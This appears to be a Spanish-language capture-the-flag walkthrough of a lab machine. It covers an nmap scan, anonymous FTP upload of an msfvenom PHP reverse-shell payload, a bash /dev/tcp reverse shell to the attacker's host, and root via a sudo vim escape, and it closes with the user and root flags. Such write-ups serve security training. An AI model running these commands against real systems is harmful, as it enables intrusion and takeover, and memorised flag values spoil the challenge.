
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.22 -oN escaneo
ftp 10.0.2.22
msfvenom -p php/reverse_php LHOST=10.0.2.4 LPORT=443 -f raw -o pwned.php
nc -nlvp 443
nc -nlvp 4444
```
Realizamos un escaner de nmap en el que encontramos los puertos 21 y 80, miraremos primero el ftp.
![[Pasted image 20240309020804.png]]
Vemos que el puerto ftp tiene la vulnerabilidad de Anonymous login así que entramos por fpt a la máquina victima poniendo el usuario anonymous sin contraseña.
```ftp
ls
put pwned.php
exit
```
![[Pasted image 20240309021302.png]]
Ahora crearemos en otra pestaña un payload malicioso con msfvenom.
![[Pasted image 20240309021511.png]]
Y lo subiremos desde el puerto ftp
![[Pasted image 20240309021556.png]]
Y ahora nos ponemos en escucha y ejecutamos el pwned.php en la máquina.
![[Pasted image 20240309021922.png]]
Ahora llamaremos a una shell reversa para hacer el tratamiento de la TTY y estabilizar la conexión que nos quedara tal que así
```shell
bash -c "sh -i >& /dev/tcp/10.0.2.4/4444 0>&1"
sudo -l
sudo vim -c ':!/bin/sh'
whoami
script /dev/null -c bash
```
![[Pasted image 20240309022046.png]]
Ahora ejecutamos el sudo -l para intentar escalar privilegios y vemos que podemos usar sudo para vim así que buscamos en gtdobins y encontramos un exploit para este binario.![[Pasted image 20240309022315.png]]
Ahora buscamos la flag de user y de root.
![[Pasted image 20240309022510.png]]
Así que seguimos buscando la de root y encontramos el siguiente path para la flag así que entramos y encontramos la flag de root.![[Pasted image 20240309022929.png]]

Flag de user: b8cff8c9008e1c98a1f2937b4475acd6
Flag de root: 66b5c58f3e83aff307441714d3e28d2f